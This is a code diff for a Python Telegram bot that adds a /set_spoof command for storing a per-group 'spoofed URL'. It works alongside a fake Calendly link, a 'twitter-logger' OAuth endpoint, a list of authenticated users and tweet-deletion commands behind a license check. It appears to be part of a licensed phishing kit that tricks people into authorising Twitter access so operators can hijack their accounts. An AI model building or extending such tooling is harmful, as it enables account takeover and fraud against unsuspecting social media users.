@@ -167,7 +167,7 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "owner_id": owner_id,
             "owner_username": owner_username,
             "identifier": identifier,
-            "spoof": "https://calendly.com/cointele"
+            "spoof": "https://calendly.com/cointele",
             "redirect": "https://calendly.com/cointele",
             "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
             "authenticated_users": [],
@@ -226,6 +226,43 @@ async def set_redirect(update: Update, context: CallbackContext) -> None:
         parse_mode = "MarkDown"
         await context.bot.send_message(chat_id, text, parse_mode)
         
+        
+async def set_spoof(update: Update, context: CallbackContext) -> None:
+    chat_id = get_chat_id(update)
+    
+    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
+        return
+    
+    if update.effective_chat.type == "private":
+        text = "❌ *This command can only be used in groups\\.*"
+        
+        await context.bot.send_message(chat_id, text, parse_mode) 
+        return
+    
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text(
+            'Usage: /set_spoof <url>')
+        return
+        
+    url = args[0]
+    
+    if not validators.url(url):
+        text = "⚠️ *The URL provided is invalid\\.*"
+        await context.bot.send_message(chat_id, text, parse_mode)
+    else:
+        group_data = {
+            "spoof": url
+        }
+        groups.update_one(
+            {"group_id": chat_id},
+            {"$set": group_data}
+        )
+        
+        text = f"✅ *Spoofed URL for this group successfully set to {url}.*"
+        parse_mode = "MarkDown"
+        await context.bot.send_message(chat_id, text, parse_mode)
+
         
 async def display_endpoint(update: Update, context: CallbackContext) -> None:
     chat_id = get_chat_id(update)
@@ -484,6 +521,7 @@ def main() -> None:
     app.add_handler(CommandHandler("delete_tweet", delete))
     app.add_handler(CommandHandler("generate_key", generate_key))
     app.add_handler(CommandHandler("set_redirect", set_redirect))
+    app.add_handler(CommandHandler("set_spoof", set_spoof))
     app.add_handler(CommandHandler("display_endpoint", display_endpoint))
     app.run_polling(poll_interval=5)
 
